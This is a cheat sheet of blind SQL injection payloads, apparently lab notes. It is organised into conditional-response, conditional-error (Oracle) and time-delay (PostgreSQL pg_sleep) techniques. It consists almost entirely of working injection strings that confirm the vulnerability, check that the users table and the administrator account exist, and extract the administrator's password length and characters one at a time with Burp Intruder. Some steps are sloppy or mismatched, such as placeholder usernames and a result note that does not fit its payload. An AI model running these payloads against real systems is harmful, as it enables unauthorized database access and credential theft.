〇Conditional Responses
1.Confirm that the parameter is vulunerable to blind SQLi
' and 1=1--' ->True
' and 1=0--' ->False

2.Confirm that we want to get table
' and (SELECT 'x' FROM YOUR-TABLE-NAME LIMIT 1)='x'--'

3.Confirm that username YOUR-USERNAME exists users table
' and (SELECT username FROM YOUR-TABLE-NAME WHERE username='x')='x'--'

4.Enumerate the password of you get YOUR-USERNAME user
' and (SELECT username FROM YOUR-TABLE-NAME WHERE username='x' and LENGTH(password)>$1$)='x'--'
 *To bruteforce password length with BurpIntruder.

' and (SELECT substring(password,$1$,1) FROM YOUR-TABLE-NAME WHERE username='x')='$a$'--'
 *Bruteforce the string from the first character to the end you want to confirm



〇Conditional Errors
1. Prove that parameter is vulnerable
' || (select '' from dual) || ' -> oracle database

2. Confirm that the users table exists in the database
' || (select '' from users where rownum =1) || ' 
-> users table exists

3. Confirm that the administrator user exists in the users table
' || (select '' from users where username='administrator') || ' 


' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
-> Internal server error -> administrator user exists

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
-> 200 response -> user does not exist in database

4. Determine length of password
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
-> 200 response at 50 -> length of password is less than 50
-> 20 characters

5. Output the administrator password
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || ' 
-> w is not the first character of the password



〇With time delays
'|| (SELECT pg_sleep(10))--



〇With time delays and information retrival
1.Confirm that the parameter is vulnerable to SQLi
' || pg_sleep(10)--

2.Confirm that the users table exists in the database
' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--

' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end from users WHERE username='administrator')--

3.Enumerate the password length
' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end from users WHERE username='administrator' and LENGTH(password)>20)--
-> length of password is 20 characters

4.Enumerate the administrator password
' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--